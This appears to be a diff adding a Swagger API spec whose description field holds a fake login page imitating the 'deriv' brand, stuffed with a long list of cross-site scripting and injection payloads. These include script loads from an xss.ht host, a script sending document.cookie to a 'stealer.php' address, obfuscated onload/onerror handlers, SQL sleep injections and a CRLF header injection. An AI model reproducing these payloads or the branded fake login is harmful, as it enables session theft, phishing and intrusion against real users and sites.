@@ -1,0 +1,189 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page by faiz
+  description: '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            border-radius: 8px;
+            padding: 2rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #e63946;
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            color: white;
+            font-size: 1rem;
+            margin: 10px 0;
+        }
+        .login {
+            background-color: #e63946;
+        }
+        .social-btn {
+            display: inline-block;
+            width: 32%;
+            margin: 0 1%;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 1rem;
+            color: white;
+            text-align: center;
+            cursor: pointer;
+        }
+        .google {
+            background-color: #db4437;
+        }
+        .facebook {
+            background-color: #3b5998;
+        }
+        .apple {
+            background-color: #000000;
+        }
+        .forgot-password {
+            margin: 10px 0;
+            font-size: 0.9rem;
+            color: #6c757d;
+        }
+        .signup {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #e63946;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>deriv</h1>
+    <p>Welcome back</p>
+
+    <input type="email" placeholder="Email" required>
+    <input type="password" placeholder="Password" required>
+    
+    <p class="forgot-password"><a href="#">Forgot password?</a></p>
+    
+    <button class="btn login">Log in</button>
+
+    <hr>
+
+    <p>Or continue with</p>
+    
+    <div>
+       <script>alert(111);</script>zhirow
+
+“><img src=x onerror=write(document.domain)>
+
+---"><script src=//zhirosec.xss.ht></script>---
+
+test"><body %00 onControl hello onmouseleave=confirm(cookie) x>XSS
+
+test"><html><select %00 onControl onpointerenter=prompt(cookie) hello>
+
+test"><input %00 onControl hello oninput=confirm(cookie) x>
+
+"><script src=https://zhirosec.xss.ht></script>
+
+</script><script>alert(document.domain)</script>
+
+<Img Src=\" OnError=alert(1)//\">
+
+<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
+
+)%20AN<>D%201=(SE<>LECT%201%20FR<>OM%20PG_SLE<>EP(5))%20AN<>D%20(1=1
+
+<svg on onload=(alert)(document.cookie)>
+
+{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}} ===> golang xss
+ 
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+<Svg%2Fonload%3Dalert(document.domain)>
+
+<svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+
+<!--><svg onload='top[/al/.source+/ert/.source](document.cookie)'>
+
+javascri%0Dpt:alert/**/(1)<svg onload=alert(document.domain)>
+
+abc"><svg+onload=confirm(document.domain)>
+
+abc"><svg+onload=confirm(document.domain)>
+
+<script>alert(1)</script>
+
+<script>alert("xss bug input search by zhirobyte")</script>
+
+"><img src=x onerror=prompt(document.cookie)>
+
+1%27/**/%256fR/**/50%2521%253D22%253B%2523
+
+<svg onload=prompt%26%230000000040document.domain)>
+
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+<script type="text/javascript">
+document.location='https://zhirobyte.000webhostapp.com/stealer.php?c='+document.cookie;</script>
+
+<script type="text/javascript">
+
+<img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))></script>
+
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+“><a href=”#” onmouseleave=alert(test)>Click
+
+<svg%20onload=alert(document.cookie)><"x
+
+1%27/**/%256fR/**/50%2521%253D22%253B%2523 
+
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.cookie)</script><!-- 
+
+    </div>
+    	<a href='javascript:alert(123);'>[Alert pop]</a><br>
+
+	<a href='javascript:alert(document.location);'>[Location]</a><br>
+
+	<a href='javascript:document.write(document.cookie);'>[Cookies]</a><br>
+
+    <p class="signup">Don’t have an account yet? <a href="#">Sign up</a></p>
+</div>
+
+</body>
+</html>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
